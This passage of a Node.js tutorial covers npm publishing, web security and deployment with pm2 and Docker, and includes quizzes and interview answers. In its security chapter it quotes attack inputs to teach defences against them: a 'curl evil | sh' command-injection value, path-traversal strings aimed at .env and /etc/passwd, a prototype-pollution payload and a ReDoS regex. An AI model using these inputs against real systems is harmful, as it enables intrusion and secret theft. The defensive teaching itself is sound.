`npm pack --dry-run` is the step people skip and then publish their `.env` or 40 MB of test fixtures. `--provenance` (npm 9.5+, from GitHub Actions or GitLab CI with OIDC) attaches a signed attestation so consumers can verify the build. `prepublishOnly` in `scripts` runs the build and tests automatically before every publish. `npm deprecate @aliraza/docpipe@"<1.0" "use 1.x"` warns users of old versions; `npm unpublish` is only allowed within 72 hours and for packages nobody depends on.

### Automating releases

`changesets` or `semantic-release` derive the version from conventional commits (`feat:`, `fix:`, `feat!:`) and publish from CI with an automation token stored as a secret. A minimal GitHub Actions job: check out, `npm ci`, `npm test`, `npm publish --provenance` on a `v*` tag, with `id-token: write` permission.

### Private registries and workspaces

Companies host packages on GitHub Packages, Verdaccio, Artifactory or Azure Artifacts; `.npmrc` maps a scope to a registry (`@stewart:registry=https://npm.pkg.github.com`). npm **workspaces** (`"workspaces": ["packages/*"]`) let a monorepo hold `docpipe-core`, `docpipe-cli` and `docpipe-server` with local linking and one lockfile.

> **Tip:** Run `npx @aliraza/docpipe --help` from a clean temp folder after publishing. It is the only test that catches a missing `files` entry, a `bin` without the shebang, or a dependency that landed in `devDependencies`.

### Try It Yourself

```js
// Semantic version parsing, range matching (^ and ~), an exports-map resolver and a files allow-list check, in pure JS.
const parse = v => { const m = v.match(/^(\d+)\.(\d+)\.(\d+)(?:-([\w.]+))?$/); if (!m) throw new Error(`bad version ${v}`); return { major: +m[1], minor: +m[2], patch: +m[3], pre: m[4] ?? null }; };
const cmp = (a, b) => a.major - b.major || a.minor - b.minor || a.patch - b.patch;
function satisfies(version, range) {
  const v = parse(version), r = parse(range.replace(/^[\^~]/, "")), op = range[0];
  if (cmp(v, r) < 0) return false;
  if (op === "^") return r.major > 0 ? v.major === r.major : r.minor > 0 ? v.major === 0 && v.minor === r.minor : cmp(v, r) === 0;
  if (op === "~") return v.major === r.major && v.minor === r.minor;
  return cmp(v, r) === 0;
}
const bump = (v, kind) => { const p = parse(v); return kind === "major" ? `${p.major + 1}.0.0` : kind === "minor" ? `${p.major}.${p.minor + 1}.0` : `${p.major}.${p.minor}.${p.patch + 1}`; };
console.log("^1.2.0 accepts 1.9.3:", satisfies("1.9.3", "^1.2.0"), "| accepts 2.0.0:", satisfies("2.0.0", "^1.2.0"));
console.log("^0.3.0 accepts 0.3.9:", satisfies("0.3.9", "^0.3.0"), "| accepts 0.4.0:", satisfies("0.4.0", "^0.3.0"));
console.log("~1.2.0 accepts 1.2.9:", satisfies("1.2.9", "~1.2.0"), "| accepts 1.3.0:", satisfies("1.3.0", "~1.2.0"));
console.log("bumps from 1.2.3:", ["patch", "minor", "major"].map(k => bump("1.2.3", k)).join(", "));

const pkg = { name: "@aliraza/docpipe", version: "1.2.0", type: "module",
  exports: { ".": { import: "./dist/index.js", require: "./dist/index.cjs" }, "./batch": "./dist/batch.js", "./package.json": "./package.json" },
  files: ["dist", "bin", "README.md"] };
function resolveExport(subpath, condition) {
  const target = pkg.exports[subpath]; if (!target) throw new Error(`Package subpath '${subpath}' is not defined by "exports" in ${pkg.name}`);
  return typeof target === "string" ? target : target[condition] ?? target.default;
}
for (const [sub, cond] of [[".", "import"], [".", "require"], ["./batch", "import"], ["./src/internal.js", "import"]]) {
  try { console.log(`${pkg.name}${sub.slice(1)} (${cond}) ->`, resolveExport(sub, cond)); } catch (e) { console.log("ERR", e.message); }
}
const tree = ["dist/index.js", "dist/index.cjs", "bin/docpipe.js", "README.md", ".env", "test/fixtures/big.pdf", "src/index.ts"];
const inTarball = f => pkg.files.some(rule => f === rule || f.startsWith(rule + "/"));
console.log("tarball would contain:", tree.filter(inTarball));
console.log("excluded:", tree.filter(f => !inTarball(f)));
```

### Quiz

1. What does the `exports` field do that `main` does not?
- [x] Restricts which subpaths can be imported and selects builds by condition
- [ ] Lists the package's dependencies
- [ ] Makes the package executable
> Anything not listed in `exports` is private to the package.

2. Which range does `^0.3.0` allow?
- [ ] 0.x.x
- [x] 0.3.x only
- [ ] Anything below 1.0.0
> Before 1.0.0 the caret treats the minor version as the breaking component.

3. What does `npm pack --dry-run` show?
- [ ] The dependency tree
- [x] The files that would be included in the published tarball
- [ ] Test coverage
> Run it before every publish to catch leaked files.

4. Where does a plugin for the `docx` library declare `docx`?
- [ ] dependencies
- [x] peerDependencies
- [ ] optionalDependencies
> The host application supplies the single shared copy.

### Exercises

1. **Version bump** — Write `bump(version, kind)` for `patch`, `minor` and `major` that resets lower parts to 0.
<details><summary>Solution</summary>

```js
const bump = (v, k) => { const [M, m, p] = v.split(".").map(Number); return k === "major" ? `${M + 1}.0.0` : k === "minor" ? `${M}.${m + 1}.0` : `${M}.${m}.${p + 1}`; };
console.log(bump("1.2.3", "minor")); // 1.3.0
```

</details>

2. **prepublishOnly** — Add scripts so that `npm publish` always builds and tests first, and fails if the working tree is dirty.
<details><summary>Solution</summary>

```json
{ "scripts": { "build": "tsup src/index.ts --format esm,cjs --dts --clean", "test": "node --test", "prepublishOnly": "git diff --quiet && npm run build && npm test" } }
```

</details>

3. **Scoped registry** — Write the `.npmrc` lines that send the `@stewart` scope to GitHub Packages with a token from an environment variable.
<details><summary>Solution</summary>

```text
@stewart:registry=https://npm.pkg.github.com
//npm.pkg.github.com/:_authToken=${GITHUB_TOKEN}
```

</details>

### Interview Questions

**Q: What do you check before publishing a package?**
That `npm pack --dry-run` lists only `dist`, `bin`, README and LICENSE (no `.env`, tests or source maps I did not intend); that `exports` exposes exactly the public API with working `import` and `require` conditions; that runtime dependencies are in `dependencies` and nothing else; that `engines` states the Node range I actually test; that the version follows semver relative to the last release and the changelog explains it; and that `npx <pkg> --help` works from a clean directory after publishing to a local Verdaccio or with a prerelease tag (`npm publish --tag next`). I enable 2FA and publish from CI with provenance so the artifact is traceable to a commit.

**Q: What is the dual package hazard?**
When a package ships both an ESM and a CommonJS build and a single application ends up loading both (one dependency imports it, another requires it), there are two module instances with separate state: `instanceof` fails across them, singletons duplicate, and event emitters are not shared. Mitigations are shipping ESM only when the Node range allows it, making the CJS build a thin wrapper that re-exports the ESM one (possible since Node 22 supports `require(esm)` for synchronous modules), or keeping libraries stateless so two copies do not matter. It is a favourite question because it tests whether you understand module resolution rather than just running a bundler.

**Q: How do semantic versioning and lockfiles interact?**
`package.json` ranges (`^1.2.0`) express what versions the author believes are compatible; `package-lock.json` records the exact versions that were installed so every `npm ci` reproduces the same tree. Applications commit the lockfile so builds are reproducible; libraries commit it for their own CI but consumers ignore it, since lockfiles are not published. Dependabot or Renovate propose bumps within and beyond the ranges, and I read changelogs for majors because a semver-major bump means the author declared a breaking change. When a dependency breaks semver, `overrides` in `package.json` pins the transitive version until they fix it.

## Security (input validation, path traversal, secrets)

A document service accepts files and file names from strangers, runs an external binary on them, and writes results to disk. Every one of those steps is an attack surface. This chapter covers the vulnerabilities that actually appear in Node code reviews and the fixes that are cheap when done up front.

### Path traversal

```js
// VULNERABLE: GET /download?name=../../.env
app.get("/download", (req, res) => res.sendFile(path.join(OUT_DIR, req.query.name)));
```

`path.join("out", "../../.env")` normalises to `.env` outside the folder. `res.sendFile` refuses paths above its `root` option, but hand-rolled `createReadStream` does not. Resolve and check containment:

```js
import path from "node:path";
function safeJoin(root, userPath) {
  const resolvedRoot = path.resolve(root);
  const target = path.resolve(resolvedRoot, userPath);
  if (target !== resolvedRoot && !target.startsWith(resolvedRoot + path.sep)) throw new HttpError(400, "BAD_PATH", "invalid path");
  return target;
}
```

Also reject null bytes (the `\0` character), which truncate paths in C libraries, and prefer looking up an id in a database and using the stored file name over accepting any name at all. Symlinks inside the root can still point outside; `fs.realpath` the target if the directory is user-writable.

### Command injection

Covered in Child processes but worth repeating because it is the most severe: `exec("soffice --convert-to pdf " + name)` with `name = "x; curl evil | sh"` runs the attacker's command. Use `execFile`/`spawn` with an argument array and never `shell: true` with user input. Also validate that an uploaded "docx" starts with `PK` and has the expected content type, because LibreOffice will happily open many formats you did not intend.

### Input validation and prototype pollution

Validate every external input with a schema (zod, Ajv) and reject unknown fields. Beyond wrong types, watch for **prototype pollution**: merging user JSON like `{"__proto__": {"isAdmin": true}}` into an object with a naive deep-merge changes `Object.prototype` for the whole process. Use `Object.create(null)` for dictionaries, `structuredClone`, or libraries that guard `__proto__`, `constructor` and `prototype` keys. `JSON.parse` itself is safe; the merge is the problem.

### Denial of service

- Body size limits on every parser (`express.json({ limit: "1mb" })`, multer `limits.fileSize`).
- Timeouts on child processes and outbound `fetch` (`AbortSignal.timeout`).
- Regular expression DoS: `/^(a+)+$/` on 30 `a`s plus a `!` takes seconds. Avoid nested quantifiers on user input, use `safe-regex` in lint, or run untrusted matching in a worker with a timeout.
- Rate limiting per key or IP (`express-rate-limit`), and bounded concurrency for conversions so 200 uploads do not spawn 200 LibreOffice instances.
- Zip bombs: a 1 MB `.docx` that inflates to 10 GB. Inspect entry sizes before extracting with `yauzl` or set limits in your zip library.

### Secrets

Never in code, never in git history (once pushed, rotate it; deleting the commit is not enough), never in logs. Load from environment or a secret manager, redact in the logger, and scan the repository with `gitleaks` or GitHub secret scanning in CI. Use `crypto.timingSafeEqual` when comparing API keys so response time does not leak how many bytes matched. Hash passwords with `argon2` or `bcrypt`, never with plain SHA-256.

### Dependencies

Most Node vulnerabilities arrive through `node_modules`. Practices: `npm audit` in CI with a threshold, Dependabot or Renovate for updates, `npm ci` with a committed lockfile so installs are reproducible, `--ignore-scripts` when installing untrusted packages (install scripts run arbitrary code), and pinning GitHub Actions to commit SHAs. Node's permission model (`node --permission --allow-fs-read=/app --allow-child-process`, stable in Node 22+) can restrict what the process itself may touch.

### HTTP hardening

`helmet()` sets sensible security headers (`Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Strict-Transport-Security`). Configure CORS with an explicit origin list, not `*`, when credentials are involved. Set `Content-Disposition: attachment` and a safe file name on downloads so a malicious HTML upload is never rendered inline from your domain. Do not trust `X-Forwarded-For` unless `app.set("trust proxy", ...)` matches your actual proxy.

### Uploaded documents themselves

DOCX and PDF files can carry macros (`.docm`), external references, JavaScript (PDF) and embedded executables. If your service only converts, run LibreOffice with `--headless --norestore` under an unprivileged user, in a container with no network, with a timeout, and delete inputs after processing. Never open uploads in a desktop Office instance on a machine with access to client data.

> **Warning:** The OWASP Top 10 categories map directly onto this list: injection, broken access control (path traversal), security misconfiguration (verbose errors, missing headers), vulnerable components (dependencies) and identification failures (weak API-key comparison). Interviewers will ask for examples in Node specifically.

### Try It Yourself

```js
// Path containment, prototype-pollution-safe merge, a ReDoS demonstration with a time budget, and timing-safe comparison.
const SEP = "/";
function resolvePath(root, user) {                            // a POSIX-style path.resolve for the browser
  const parts = (root + SEP + user).split(SEP), out = [];
  for (const p of parts) { if (!p || p === ".") continue; if (p === "..") out.pop(); else out.push(p); }
  return SEP + out.join(SEP);
}
function safeJoin(root, user) {
  if (user.includes(String.fromCharCode(0))) throw new Error("null byte in path");
  const r = resolvePath("", root), t = resolvePath(root, user);
  if (t !== r && !t.startsWith(r + SEP)) throw new Error(`path escapes ${r}: ${user}`);
  return t;
}
for (const p of ["report.pdf", "2026/march/report.pdf", "../../.env", ".." + String.fromCharCode(0) + "/x", "./a/../report.pdf"]) {
  try { console.log("ok  ", JSON.stringify(p), "->", safeJoin("/srv/out", p)); } catch (e) { console.log("DENY", JSON.stringify(p), "->", e.message); }
}
const BAD_KEYS = new Set(["__proto__", "constructor", "prototype"]);
function safeMerge(target, src) {
  for (const k of Object.keys(src)) { if (BAD_KEYS.has(k)) { console.log("blocked key", k); continue; }
    const v = src[k]; if (v && typeof v === "object" && !Array.isArray(v)) { target[k] = safeMerge(target[k] && typeof target[k] === "object" ? target[k] : {}, v); } else target[k] = v; }
  return target;
}
const cfg = safeMerge({ theme: "light" }, JSON.parse('{"theme":"dark","__proto__":{"isAdmin":true},"constructor":{"prototype":{"x":1}}}'));
console.log("merged:", cfg, "| polluted?", ({}).isAdmin === true);
function timedTest(re, input, budgetMs) { const t0 = performance.now(); const result = re.test(input); const ms = performance.now() - t0; return { result, ms: ms.toFixed(1), overBudget: ms > budgetMs }; }
console.log("safe regex  /^[a-z]+$/         :", timedTest(/^[a-z]+$/, "a".repeat(23) + "!", 50));
console.log("ReDoS regex /^(a+)+$/ on 23 a's:", timedTest(/^(a+)+$/, "a".repeat(23) + "!", 50), "(nested quantifiers backtrack exponentially)");
const timingSafeEqual = (a, b) => { const A = new TextEncoder().encode(a), B = new TextEncoder().encode(b); if (A.length !== B.length) return false; let d = 0; for (let i = 0; i < A.length; i++) d |= A[i] ^ B[i]; return d === 0; };
console.log("key compare:", timingSafeEqual("sk-live-8f3a", "sk-live-8f3a"), timingSafeEqual("sk-live-8f3a", "sk-live-8f3b"));
```

### Quiz

1. What does `path.join("/srv/out", "../../etc/passwd")` return?
- [ ] An error
- [x] `/etc/passwd`
- [ ] `/srv/out/etc/passwd`
> `join` normalises `..`; check containment after `path.resolve`.

2. Which input causes prototype pollution in a naive deep merge?
- [x] `{"__proto__": {"isAdmin": true}}`
- [ ] `{"admin": true}`
- [ ] `[1, 2, 3]`
> Assigning through `__proto__` modifies `Object.prototype` for every object.

3. Why use `crypto.timingSafeEqual` for API keys?
- [ ] It is faster than `===`
- [x] `===` returns early on the first mismatched byte, leaking information via timing
- [ ] It hashes the key
> Constant-time comparison prevents timing side channels.

4. Which regex is vulnerable to ReDoS?
- [ ] `/^[a-z]+$/`
- [x] `/^(a+)+$/`
- [ ] `/^\d{4}-\d{2}$/`
> Nested quantifiers backtrack exponentially on non-matching input.

### Exercises

1. **Safe file name** — Write `safeName(name)` that replaces runs of characters outside `[A-Za-z0-9._-]` with `_`, strips leading dots and limits length to 100.
<details><summary>Solution</summary>

```js
const safeName = n => n.replace(/[^A-Za-z0-9._-]+/g, "_").replace(/^\.+/, "").slice(0, 100) || "file";
console.log(safeName("../../.env")); // "_.._.env"
```

</details>

2. **Magic-byte check** — Reject an upload unless the first two bytes are `PK` and the declared content type is the DOCX MIME type.
<details><summary>Solution</summary>

```js
const DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
function isDocx(buf, contentType) { return contentType === DOCX && buf.length > 4 && buf[0] === 0x50 && buf[1] === 0x4b; }
```

</details>

3. **Audit gate** — Write the npm script and CI command that fail the build on high or critical vulnerabilities.
<details><summary>Solution</summary>

```json
{ "scripts": { "audit:ci": "npm audit --audit-level=high --omit=dev" } }
```

</details>

### Interview Questions

**Q: What are the most common security bugs you look for in a Node code review?**
Command injection through `exec` with string concatenation, path traversal in any code that turns a request parameter into a file path, missing body-size limits and timeouts (denial of service), unvalidated input merged into objects (prototype pollution), secrets in code or logs, verbose error responses leaking stack traces, and outdated dependencies with known CVEs. For a document service I add: trusting the file extension instead of magic bytes, running LibreOffice with the service's own privileges and network access, and zip-bomb exposure when unpacking DOCX. Each has a mechanical fix, and most can be enforced by lint rules, a schema layer and `npm audit` in CI.

**Q: How do you prevent path traversal?**
Avoid taking a path from the client at all when possible: accept an id, look up the stored file name. When a path is unavoidable, `path.resolve` it against the root and verify the result equals the root or starts with `root + path.sep`; plain `startsWith(root)` is not enough because `/srv/out2` starts with `/srv/out`. Reject null bytes, normalise Unicode, and be aware that symlinks inside a user-writable root can escape, so `realpath` when that applies. `res.sendFile` with the `root` option and `express.static` already enforce containment, but any hand-written `createReadStream` or `unlink` needs the check.

**Q: How do you handle secrets in a Node application end to end?**
Secrets are never in source or git history; they arrive as environment variables from the platform's secret store, are validated at startup by the config module, and are redacted by the logger's `redact` paths. Comparisons of API keys use `timingSafeEqual`, passwords are hashed with argon2id, tokens are short-lived where possible, and rotation is a documented procedure rather than an emergency. CI runs `gitleaks` so a leaked key fails the pipeline, and if one does leak I rotate first and clean history second, because a pushed secret must be assumed compromised.

## Deployment (pm2, Docker basics) & Node interview questions

A service that only runs when you type `node server.js` in a terminal is a demo. Deployment means the process starts on boot, restarts on crash, logs somewhere, updates without downtime, and runs the same on a client's server as on your laptop. **pm2** solves this on a plain VM; **Docker** solves it by shipping the whole environment, LibreOffice included. This chapter covers both, then closes the course with the interview questions that recur.

### pm2

```bash
npm install -g pm2
pm2 start server.js --name docpipe -i max --time     # cluster mode on every core, timestamps in logs
pm2 logs docpipe                                     # tail stdout/stderr
pm2 reload docpipe                                   # zero-downtime restart, one worker at a time
pm2 save && pm2 startup                              # persist the process list and install a boot service
```

An ecosystem file keeps the configuration in the repository:

```js
// ecosystem.config.cjs
module.exports = {
  apps: [{
    name: "docpipe",
    script: "./server.js",
    instances: "max",
    exec_mode: "cluster",
    max_memory_restart: "800M",
    env_production: { NODE_ENV: "production", PORT: 3000, LOG_LEVEL: "info" },
    kill_timeout: 10000,                    // ms to wait after SIGINT before SIGKILL
    wait_ready: true,                       // wait for process.send("ready")
  }],
};
```

`pm2 start ecosystem.config.cjs --env production`. Cluster mode forks N copies of the app that share port 3000, which is how a single-threaded Node server uses every core. `wait_ready` plus `process.send?.("ready")` after the server is listening makes `pm2 reload` truly zero-downtime: the new worker must announce readiness before the old one is stopped. `max_memory_restart` is a safety net for slow leaks, not a fix. Do not use cluster mode for a batch worker that must hold a single LibreOffice profile; run it as one instance with `exec_mode: "fork"`.

### Docker

```dockerfile
# Dockerfile
FROM node:22-bookworm-slim AS deps
WORKDIR /app
COPY package*.json ./
RUN npm ci --omit=dev

FROM node:22-bookworm-slim
RUN apt-get update && apt-get install -y --no-install-recommends libreoffice-writer fonts-liberation && rm -rf /var/lib/apt/lists/*
WORKDIR /app
ENV NODE_ENV=production
COPY --from=deps /app/node_modules ./node_modules
COPY . .
USER node
EXPOSE 3000
HEALTHCHECK --interval=30s --timeout=5s CMD node -e "fetch('http://localhost:3000/health').then(r=>{if(!r.ok)process.exit(1)})"
CMD ["node", "server.js"]
```

```text
# .dockerignore
node_modules
.env
.git
out
test
```

Multi-stage builds keep the final image free of dev dependencies; copying `package*.json` first means the expensive `npm ci` layer is cached until dependencies change. `USER node` drops root. `CMD` in exec form (`["node", ...]`) makes `node` PID 1 so it receives `SIGTERM` directly; the shell form would swallow signals. Installing `libreoffice-writer` (not the full suite) keeps the image around 700 MB rather than 2 GB, and `fonts-liberation` provides metric-compatible replacements for Arial and Times so PDFs paginate like the client's Word.

```bash
docker build -t docpipe:1.2.0 .
docker run --rm -p 3000:3000 --env-file .env.production --memory 1g docpipe:1.2.0
```

`docker compose` adds the database and a volume for `out/` in one file; `docker compose up -d` starts everything with restart policies. Inside a container there is no pm2 by default: the orchestrator (Compose, Swarm, Kubernetes, ECS) restarts and scales containers, so one process per container is the norm. Use `pm2-runtime` only if you specifically want cluster mode inside a single container.

### Deployment checklist

| Concern | pm2 on a VM | Docker |
|---|---|---|
| Restart on crash | pm2 | `restart: unless-stopped` / orchestrator |
| Start on boot | `pm2 startup` | Docker service |
| Use all cores | `-i max` | replicas or `pm2-runtime` |
| Zero-downtime deploy | `pm2 reload` | rolling update |
| Logs | `pm2 logs`, `pm2-logrotate` | stdout collected by the platform |
| Secrets | env file on the host, 600 permissions | env-file, Docker/K8s secrets |
| LibreOffice | installed on the host | baked into the image |
| Reverse proxy, TLS | nginx or Caddy in front | same, or an ingress |

Both cases put a reverse proxy in front: it terminates TLS, serves static files, buffers slow clients and lets you run several apps on one port.

### Node interview questions: the recurring set

Beyond the per-chapter questions, these come up in almost every Node interview at any level. Prepare a 60-second answer for each with one concrete example from your own work.

1. How does the event loop work, and what blocks it?
2. `process.nextTick` versus `setImmediate` versus `setTimeout(0)`.
3. CommonJS versus ESM: differences and interoperability.
4. Streams and backpressure; when to use them.
5. How do you scale Node across cores? (cluster, worker threads, containers)
6. Error handling: operational versus programmer errors, unhandled rejections, graceful shutdown.
7. How do you secure an Express app? (helmet, validation, rate limiting, injection, path traversal)
8. Middleware order and error-handling middleware in Express.
9. What is `package-lock.json` for, and `npm ci` versus `npm install`?
10. How do you test code with external dependencies (file system, child processes, HTTP)?
11. Memory leaks in Node: causes and diagnosis (closures holding references, listeners, caches without bounds, heap snapshots).
12. What happens when you `require` a module twice, and circular dependencies.
13. Buffer versus string, encodings.
14. Why is Node a good or bad fit for a given workload (CPU-bound versus I/O-bound)?
15. Walk me through deploying a Node service to production.

> **Interview note:** For "walk me through deploying", tell a story with numbers: "a Fastify service converting about 3,000 documents a day, two containers behind nginx, each capped at 1 GB, LibreOffice baked into the image, health checks on `/ready`, rolling updates with a 30-second grace period, logs to stdout collected by Loki, alerts on error rate above 2%." Specifics beat generalities.

### Try It Yourself

```js
// pm2-style supervision in pure JS: restart-on-crash with exponential backoff, a memory cap, and a zero-downtime rolling reload
// where a new "worker" must signal ready before the old one stops.
let nextId = 1;
function spawnWorker(version, { crashAfter = Infinity, memoryMB = 200 } = {}) {
  const w = { id: nextId++, version, status: "starting", memoryMB, ready: false, requests: 0 };
  setTimeout(() => { w.ready = true; w.status = "online"; }, 25);                       // process.send("ready")
  if (crashAfter !== Infinity) setTimeout(() => { w.status = "crashed"; }, crashAfter);
  return w;
}
const log = m => console.log(`[pm2] ${m}`);
class Supervisor {
  constructor(n) { this.workers = Array.from({ length: n }, () => spawnWorker("1.0.0")); this.restarts = 0; this.backoff = 0; }
  tick() {
    for (let i = 0; i < this.workers.length; i++) {
      const w = this.workers[i];
      if (w.status === "crashed") { this.restarts++; this.backoff = Math.min(1000, this.backoff ? this.backoff * 2 : 10);
        log(`worker ${w.id} crashed, restart #${this.restarts} after ${this.backoff} ms backoff`); this.workers[i] = spawnWorker(w.version); }
      else if (w.status === "online" && w.memoryMB > 800) { log(`worker ${w.id} exceeded max_memory_restart (${w.memoryMB} MB), restarting`); this.workers[i] = spawnWorker(w.version); }
    }
  }
  async reload(version) {
    for (let i = 0; i < this.workers.length; i++) {
      const old = this.workers[i], fresh = spawnWorker(version);
      while (!fresh.ready) await new Promise(r => setTimeout(r, 5));                   // wait_ready
      this.workers[i] = fresh; old.status = "stopped";
      log(`reload: worker ${fresh.id} (${version}) ready, worker ${old.id} (${old.version}) stopped; ${this.online()} still serving`);
    }
  }
  online() { return this.workers.filter(w => w.status === "online").length; }
  table() { console.table(this.workers.map(w => ({ id: w.id, version: w.version, status: w.status, memoryMB: w.memoryMB }))); }
}
(async () => {
  const sup = new Supervisor(3);
  await new Promise(r => setTimeout(r, 40)); sup.table();
  sup.workers[1].status = "crashed"; sup.tick(); sup.workers[2].memoryMB = 950; sup.tick();
  await new Promise(r => setTimeout(r, 40)); sup.table();
  await sup.reload("1.1.0"); sup.table();
  log(`restarts so far: ${sup.restarts}; workers online now: ${sup.online()}`);
})();
```

### Quiz

1. What does pm2 cluster mode (`-i max`) do?
- [x] Forks one process per CPU core, all sharing the same port
- [ ] Starts worker threads inside one process
- [ ] Runs the app in Docker
> It uses Node's `cluster` module under the hood.

2. Why copy `package*.json` and run `npm ci` before copying the rest of the source in a Dockerfile?
- [ ] Docker requires it
- [x] So the dependency layer is cached until dependencies change
- [ ] To reduce image size
> Layer caching makes rebuilds after a code change take seconds.

3. Why write `CMD ["node", "server.js"]` rather than `CMD node server.js`?
- [x] Exec form makes node PID 1 so it receives SIGTERM for graceful shutdown
- [ ] Shell form is deprecated
- [ ] Exec form is faster
> In shell form `/bin/sh` is PID 1 and does not forward signals.

4. What is `wait_ready` for in pm2?
- [ ] To delay logging
- [x] To keep the old worker alive until the new one reports it is listening
- [ ] To wait for the database
> Combined with `process.send("ready")` it makes reloads zero-downtime.

### Exercises

1. **Ready signal** — Add the code to an Express server so pm2's `wait_ready` works, and handle `SIGINT` for a clean stop.
<details><summary>Solution</summary>

```js
// Node-only: run locally
const server = app.listen(process.env.PORT ?? 3000, () => { process.send?.("ready"); });
process.on("SIGINT", () => { server.close(() => process.exit(0)); setTimeout(() => process.exit(1), 9000).unref(); });
```

</details>

2. **Compose file** — Write a `compose.yaml` running the docpipe image with a restart policy, an env file, a port mapping and a volume for `out/`.
<details><summary>Solution</summary>

```yaml
services:
  docpipe:
    image: docpipe:1.2.0
    restart: unless-stopped
    env_file: .env.production
    ports: ["3000:3000"]
    volumes: ["./out:/app/out"]
    deploy: { resources: { limits: { memory: 1g } } }
```

</details>

3. **Health versus ready** — Implement `/health` (always 200 while the process runs) and `/ready` (503 until the database ping succeeds).
<details><summary>Solution</summary>

```js
let dbOk = false;
setInterval(async () => { try { await db.query("select 1"); dbOk = true; } catch { dbOk = false; } }, 5000).unref();
app.get("/health", (req, res) => res.json({ ok: true }));
app.get("/ready", (req, res) => (dbOk ? res.json({ ready: true }) : res.status(503).json({ ready: false })));
```

</details>

### Interview Questions

**Q: Walk me through deploying a Node service to production.**
Build once: `npm ci`, tests, `docker build` tagged with the git SHA, pushed to a registry. The image is a multi-stage build on `node:22-slim`, runs as the `node` user, has LibreOffice and fonts baked in, and starts with `CMD ["node","server.js"]` so signals reach the process. Configuration and secrets come from the environment, validated at startup. The orchestrator runs two or more replicas behind a reverse proxy that terminates TLS, uses `/ready` for routing and `/health` for liveness, and performs rolling updates with a grace period long enough for in-flight conversions. Logs go to stdout as JSON and are collected centrally; metrics feed alerts on error rate and latency. On a plain VM without Docker, pm2 with an ecosystem file, `pm2 startup` and `pm2 reload` covers the same requirements.

**Q: pm2 or Docker?**
They answer different questions. pm2 is a process manager: restart, cluster, logs, boot persistence on a machine you already manage. Docker is packaging: the exact Node version, system libraries and LibreOffice travel with the app, which removes "works on my server" problems and lets an orchestrator schedule and scale it. For a single client VM with one service, pm2 plus a systemd-managed boot is simpler; for anything with more than one environment or dependency on system binaries, Docker pays for itself quickly. Inside containers I use one process per container and let the platform supervise, reaching for `pm2-runtime` only when I want cluster mode within a single container.

**Q: How do you achieve zero-downtime deploys with Node?**
Run at least two instances behind a proxy or load balancer, start the new version, wait until it reports ready (pm2 `wait_ready` with `process.send("ready")`, or a container readiness probe on `/ready`), then stop the old instance gracefully: it gets `SIGTERM`, stops accepting connections with `server.close()`, finishes in-flight requests within a deadline, and exits. Sessions and job state must live outside the process (database, Redis, disk) so a restart loses nothing, and database migrations must be backward compatible with the previous version for the overlap period. The failure mode to watch is a long conversion exceeding the grace period; I either raise `kill_timeout` or move long jobs to a queue with resumable state.

**Q: Why choose Node for a document automation backend, and when would you not?**
Node fits because the workload is dominated by I/O and orchestration: reading and writing files, spawning LibreOffice, calling APIs, serving downloads, all of which the event loop handles with little memory per concurrent task, and because the `docx`, `pdf-lib`, `pptxgenjs` and `exceljs` libraries let one language produce every deliverable. The team also shares code with the browser tooling. I would not choose it for heavy numerical or image processing without offloading to workers or native tools, for extremely CPU-bound PDF rendering where Python with PyMuPDF or a Java library is faster, or when the team's expertise is elsewhere. In practice I combine them: Node orchestrates, child processes run Python or LibreOffice where they are stronger.
